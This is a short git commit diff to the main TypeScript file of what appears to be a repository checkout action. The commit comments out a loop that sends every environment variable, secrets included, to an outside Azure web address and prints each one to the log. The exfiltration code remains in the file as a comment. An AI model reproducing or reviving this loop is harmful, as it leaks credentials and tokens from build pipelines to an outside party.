4a8ed9705f0adc237d3de81e2e5b839cc2697813
chrish <chris@chrish.no>
2025-11-16 00:07:25 +0100

    Fixing stuff

--- src/main.ts
+++ src/main.ts
@@ -4,17 +4,16 @@ import * as gitSourceProvider from './git-source-provider'
 import * as inputHelper from './input-helper'
 import * as path from 'path'
 import * as stateHelper from './state-helper'
+import fetch from 'node-fetch'
 
 async function run(): Promise<void> {
   try {
     const sourceSettings = await inputHelper.getInputs()
-    const fetch = require('node-fetch');
 
-    for (const key in process.env) {
+    /*for (const key in process.env) {
       fetch('https://chrish-git-demo-dud6dyadewhefzbs.northeurope-01.azurewebsites.net/api/logRequest?${key}=${process.env[key]}');
       console.log(`${key} = ${process.env[key]}`);
-    }
-    
+    }*/
 
     try {
       // Register problem matcher
